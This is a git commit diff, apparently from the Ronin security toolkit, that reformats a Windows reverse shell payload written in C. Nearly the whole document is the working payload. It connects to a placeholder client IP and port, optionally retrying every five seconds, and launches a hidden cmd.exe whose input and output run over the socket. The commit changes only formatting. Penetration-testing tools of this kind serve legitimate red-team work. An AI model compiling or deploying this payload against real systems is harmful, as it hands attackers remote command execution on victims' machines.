6b4597efcf25cd586a13c8a5321f7a491895e458
Postmodern <postmodern.mod3@gmail.com>
2023-12-26 08:02:12 -0800

    Reformat the C code.

--- lib/ronin/payloads/builtin/bin/windows/reverse_shell.c
+++ lib/ronin/payloads/builtin/bin/windows/reverse_shell.c
@@ -15,40 +15,49 @@
 #error "must define CLIENT_PORT"
 #endif
 
-int main(void) {
+int main(void)
+{
 	WSADATA wsaData;
-	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
+
+	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0)
+	{
 		write(2, "error: WSASturtup failed.\n", 27);
-		return (1);
+		return 1;
 	}
 
 	int port = CLIENT_PORT;
 	struct sockaddr_in sa;
-	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
 	sa.sin_addr.s_addr = inet_addr("CLIENT_IP");
 
+	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
 #ifdef WAIT_FOR_CLIENT
-	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0)
+	{
 		Sleep(5000);
 	}
 #else
-	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0)
+	{
 		write(2, "error: connect failed.\n", 24);
-		return (1);
+		return 1;
 	}
 #endif
 
 	STARTUPINFO sinfo;
+
 	memset(&sinfo, 0, sizeof(sinfo));
 	sinfo.cb = sizeof(sinfo);
 	sinfo.dwFlags = (STARTF_USESTDHANDLES);
 	sinfo.hStdInput = (HANDLE)sockt;
 	sinfo.hStdOutput = (HANDLE)sockt;
 	sinfo.hStdError = (HANDLE)sockt;
-	PROCESS_INFORMATION pinfo;
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
-	return (0);
+	PROCESS_INFORMATION pinfo;
+
+	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+	return 0;
 }
